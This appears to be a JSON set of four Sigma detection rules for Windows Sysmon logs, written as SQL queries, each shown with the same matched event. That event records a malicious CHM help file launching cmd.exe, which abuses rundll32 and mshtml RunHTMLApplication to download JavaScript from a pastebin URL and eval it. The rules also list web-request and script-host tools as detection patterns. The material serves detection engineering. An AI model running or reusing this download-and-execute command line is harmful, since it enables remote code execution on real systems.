[{
  "title": "Mshtml.DLL RunHTMLApplication Suspicious Usage",
  "id": "4782eb5a-a513-4523-a0ac-f3082b26ac5c",
  "description": "Detects execution of commands that leverage the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, http...)\n",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((CommandLine LIKE '%\\\\..\\\\%' ESCAPE '\\' AND CommandLine LIKE '%mshtml%' ESCAPE '\\') AND (CommandLine LIKE '%#135%' ESCAPE '\\' OR CommandLine LIKE '%RunHTMLApplication%' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.defense-evasion",
    "attack.execution"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c copy /Y C:\\Windows\\system32\\rundll32.exe %%TEMP%%\\out.exe > nul && %%TEMP%%\\out.exe javascript:\"\\..\\mshtml RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://pastebin.com/raw/y2CjnRtH\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im out.exe\",0,true);}",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Users\\IEUser\\Desktop\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 4353,
      "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",
      "IMPHASH": "272245E2988E1E430500B852C4FB5E18",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-ABD5-5D3A-0000-0020EB990F00",
      "LogonId": "0xf99eb",
      "MD5": "975B45B669930B0CC773EAF2B414206F",
      "Opcode": 0,
      "OriginalLogfile": "Sysmon_Exec_CompiledHTML.evtx",
      "ParentCommandLine": "\"C:\\Windows\\hh.exe\" C:\\Users\\IEUser\\Desktop\\Fax Record N104F.chm",
      "ParentImage": "C:\\Windows\\hh.exe",
      "ParentProcessGuid": "747F3D96-AE22-5D3A-0000-001096B24E00",
      "ParentProcessId": 1504,
      "ProcessGuid": "747F3D96-AE22-5D3A-0000-001004D84E00",
      "ProcessID": 5924,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "8C5437CD76A89EC983E3B364E219944DA3DAB464",
      "SHA256": "3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2",
      "SystemTime": "2019-07-26T07:39:14.935857Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 6056,
      "User": "MSEDGEWIN10\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-07-26 07:39:14.853",
      "Version": 5
    }
  ]
},
{
  "title": "HTML Help HH.EXE Suspicious Child Process",
  "id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
  "description": "Detects a suspicious child process of a Microsoft HTML Help (HH.exe)",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (ParentImage LIKE '%\\\\hh.exe' ESCAPE '\\' AND (Image LIKE '%\\\\CertReq.exe' ESCAPE '\\' OR Image LIKE '%\\\\CertUtil.exe' ESCAPE '\\' OR Image LIKE '%\\\\cmd.exe' ESCAPE '\\' OR Image LIKE '%\\\\cscript.exe' ESCAPE '\\' OR Image LIKE '%\\\\installutil.exe' ESCAPE '\\' OR Image LIKE '%\\\\MSbuild.exe' ESCAPE '\\' OR Image LIKE '%\\\\MSHTA.EXE' ESCAPE '\\' OR Image LIKE '%\\\\msiexec.exe' ESCAPE '\\' OR Image LIKE '%\\\\powershell.exe' ESCAPE '\\' OR Image LIKE '%\\\\pwsh.exe' ESCAPE '\\' OR Image LIKE '%\\\\regsvr32.exe' ESCAPE '\\' OR Image LIKE '%\\\\rundll32.exe' ESCAPE '\\' OR Image LIKE '%\\\\schtasks.exe' ESCAPE '\\' OR Image LIKE '%\\\\wmic.exe' ESCAPE '\\' OR Image LIKE '%\\\\wscript.exe' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.defense-evasion",
    "attack.execution",
    "attack.initial-access",
    "attack.t1047",
    "attack.t1059.001",
    "attack.t1059.003",
    "attack.t1059.005",
    "attack.t1059.007",
    "attack.t1218",
    "attack.t1218.001",
    "attack.t1218.010",
    "attack.t1218.011",
    "attack.t1566",
    "attack.t1566.001"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c copy /Y C:\\Windows\\system32\\rundll32.exe %%TEMP%%\\out.exe > nul && %%TEMP%%\\out.exe javascript:\"\\..\\mshtml RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://pastebin.com/raw/y2CjnRtH\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im out.exe\",0,true);}",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Users\\IEUser\\Desktop\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 4353,
      "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",
      "IMPHASH": "272245E2988E1E430500B852C4FB5E18",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-ABD5-5D3A-0000-0020EB990F00",
      "LogonId": "0xf99eb",
      "MD5": "975B45B669930B0CC773EAF2B414206F",
      "Opcode": 0,
      "OriginalLogfile": "Sysmon_Exec_CompiledHTML.evtx",
      "ParentCommandLine": "\"C:\\Windows\\hh.exe\" C:\\Users\\IEUser\\Desktop\\Fax Record N104F.chm",
      "ParentImage": "C:\\Windows\\hh.exe",
      "ParentProcessGuid": "747F3D96-AE22-5D3A-0000-001096B24E00",
      "ParentProcessId": 1504,
      "ProcessGuid": "747F3D96-AE22-5D3A-0000-001004D84E00",
      "ProcessID": 5924,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "8C5437CD76A89EC983E3B364E219944DA3DAB464",
      "SHA256": "3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2",
      "SystemTime": "2019-07-26T07:39:14.935857Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 6056,
      "User": "MSEDGEWIN10\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-07-26 07:39:14.853",
      "Version": 5
    }
  ]
},
{
  "title": "Usage Of Web Request Commands And Cmdlets",
  "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
  "description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (CommandLine LIKE '%[System.Net.WebRequest]::create%' ESCAPE '\\' OR CommandLine LIKE '%curl %' ESCAPE '\\' OR CommandLine LIKE '%Invoke-RestMethod%' ESCAPE '\\' OR CommandLine LIKE '%Invoke-WebRequest%' ESCAPE '\\' OR CommandLine LIKE '% irm %' ESCAPE '\\' OR CommandLine LIKE '%iwr %' ESCAPE '\\' OR CommandLine LIKE '%Resume-BitsTransfer%' ESCAPE '\\' OR CommandLine LIKE '%Start-BitsTransfer%' ESCAPE '\\' OR CommandLine LIKE '%wget %' ESCAPE '\\' OR CommandLine LIKE '%WinHttp.WinHttpRequest%' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.execution",
    "attack.t1059.001"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c copy /Y C:\\Windows\\system32\\rundll32.exe %%TEMP%%\\out.exe > nul && %%TEMP%%\\out.exe javascript:\"\\..\\mshtml RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://pastebin.com/raw/y2CjnRtH\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im out.exe\",0,true);}",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Users\\IEUser\\Desktop\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 4353,
      "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",
      "IMPHASH": "272245E2988E1E430500B852C4FB5E18",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-ABD5-5D3A-0000-0020EB990F00",
      "LogonId": "0xf99eb",
      "MD5": "975B45B669930B0CC773EAF2B414206F",
      "Opcode": 0,
      "OriginalLogfile": "Sysmon_Exec_CompiledHTML.evtx",
      "ParentCommandLine": "\"C:\\Windows\\hh.exe\" C:\\Users\\IEUser\\Desktop\\Fax Record N104F.chm",
      "ParentImage": "C:\\Windows\\hh.exe",
      "ParentProcessGuid": "747F3D96-AE22-5D3A-0000-001096B24E00",
      "ParentProcessId": 1504,
      "ProcessGuid": "747F3D96-AE22-5D3A-0000-001004D84E00",
      "ProcessID": 5924,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "8C5437CD76A89EC983E3B364E219944DA3DAB464",
      "SHA256": "3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2",
      "SystemTime": "2019-07-26T07:39:14.935857Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 6056,
      "User": "MSEDGEWIN10\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-07-26 07:39:14.853",
      "Version": 5
    }
  ]
},
{
  "title": "Wscript Shell Run In CommandLine",
  "id": "2c28c248-7f50-417a-9186-a85b223010ee",
  "description": "Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (CommandLine LIKE '%Wscript.%' ESCAPE '\\' AND CommandLine LIKE '%.Shell%' ESCAPE '\\' AND CommandLine LIKE '%.Run%' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.execution",
    "attack.t1059"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c copy /Y C:\\Windows\\system32\\rundll32.exe %%TEMP%%\\out.exe > nul && %%TEMP%%\\out.exe javascript:\"\\..\\mshtml RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://pastebin.com/raw/y2CjnRtH\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im out.exe\",0,true);}",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Users\\IEUser\\Desktop\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 4353,
      "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",
      "IMPHASH": "272245E2988E1E430500B852C4FB5E18",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-ABD5-5D3A-0000-0020EB990F00",
      "LogonId": "0xf99eb",
      "MD5": "975B45B669930B0CC773EAF2B414206F",
      "Opcode": 0,
      "OriginalLogfile": "Sysmon_Exec_CompiledHTML.evtx",
      "ParentCommandLine": "\"C:\\Windows\\hh.exe\" C:\\Users\\IEUser\\Desktop\\Fax Record N104F.chm",
      "ParentImage": "C:\\Windows\\hh.exe",
      "ParentProcessGuid": "747F3D96-AE22-5D3A-0000-001096B24E00",
      "ParentProcessId": 1504,
      "ProcessGuid": "747F3D96-AE22-5D3A-0000-001004D84E00",
      "ProcessID": 5924,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "8C5437CD76A89EC983E3B364E219944DA3DAB464",
      "SHA256": "3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2",
      "SystemTime": "2019-07-26T07:39:14.935857Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 6056,
      "User": "MSEDGEWIN10\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-07-26 07:39:14.853",
      "Version": 5
    }
  ]
}]